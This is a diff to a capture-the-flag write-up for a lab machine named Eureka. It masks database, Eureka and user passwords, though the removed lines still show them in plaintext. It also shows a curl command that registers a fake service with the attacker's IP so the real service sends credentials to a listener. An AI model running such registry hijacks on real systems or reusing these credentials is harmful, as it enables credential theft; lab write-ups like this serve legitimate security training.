@@ -56,14 +56,14 @@ The output reveals several crucial pieces of information:
   * **MySQL Database Credentials**:
 
       * `username`: **oscar190**
-      * `password`: **0sc@r190\_S0l\!dP@sswd**
+      * `password`: **0sc@r19XXXXXXXXXXXXXXXX**
       * `url`: `jdbc:mysql://localhost:3306/Furni_WebApp_DB`
 
   * **Eureka Server Credentials**:
 
       * `username`: **EurekaSrvr**
-      * `password`: **0scarPWDisTheB3st**
-      * `url`: `http://EurekaSrvr:0scarPWDisTheB3st@localhost:8761/eureka/`
+      * `password`: **0scarXXXXXXXXXXXXX**
+      * `url`: `http://EurekaSrvr:0scarXXXXXXXXXXXXX@localhost:8761/eureka/`
 
 ### SSH Access
 
@@ -92,7 +92,7 @@ By default, Eureka servers allow **any service to register** without authenticat
 The `Hacking Netflix Eureka` article provides a method for this exploit. We'll register a fake service and set its IP to our local machine, listening on port 8081.
 
 ```bash
-oscar190@eureka:~$ curl -X POST http://EurekaSrvr:0scarPWDisTheB3st@localhost:8761/eureka/apps/USER-MANAGEMENT-SERVICE  -H 'Content-Type: application/json' -d '{ 
+oscar190@eureka:~$ curl -X POST http://EurekaSrvr:0scarXXXXXXXXXXXXX@localhost:8761/eureka/apps/USER-MANAGEMENT-SERVICE  -H 'Content-Type: application/json' -d '{ 
   "instance": {
     "instanceId": "USER-MANAGEMENT-SERVICE",
     "hostName": "10.10.xx.xx",
@@ -122,7 +122,7 @@ After registering the fake service, you need to listen for incoming connections 
 A short time after the registration, the genuine `user-management-service` will send a request to your listening port, disclosing a new set of credentials:
 
   * **Username**: **miranda.wise@furni.htb**
-  * **Password**: **IL\!veT0Be\&BeT0L0ve**
+  * **Password**: **IL\!veXXXXXXXXXXXXXXX**
 
 You can now use these credentials to switch to the `miranda-wise` user.
 
